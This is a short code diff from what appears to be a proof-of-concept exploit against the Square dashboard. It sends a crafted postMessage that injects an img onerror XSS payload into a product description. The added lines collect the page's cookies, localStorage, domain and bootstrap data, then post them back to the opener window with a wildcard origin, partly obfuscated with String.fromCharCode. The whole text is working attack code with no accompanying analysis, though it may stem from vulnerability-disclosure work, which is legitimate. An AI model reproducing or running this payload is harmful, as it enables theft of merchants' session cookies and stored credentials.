@@ -10,6 +10,9 @@
     // Open the Square dashboard in a new window
     const w = window.open('https://app.squareup.com/dashboard/payment-links/new');
 
+    var xss = 'var d={domain:document.domain,cookies:document.cookie,localStorage:JSON.stringify(localStorage),bootstrap:window.bootstrap};';
+    xss += 'var o=top.opener||opener;if(o){o.postMessage({stolen:d},String.fromCharCode(42));}alert(String.fromCharCode(88,83,83,32,111,110,32)+document.domain);';
+
     // Payload that gets injected into the target window via postMessage
     const payload = {
       name: 'LINK_PREVIEW',
@@ -40,7 +43,7 @@
               item_data: {
                 name: 'HACKED',
                 description_html: '',
-                description: `<img src=x onerror="alert(JSON.stringify(window.bootstrap));">`,
+                description: `<img src=x onerror=${xss}>`,
                 variations: [
                   {
                     type: 'ITEM_VARIATION',
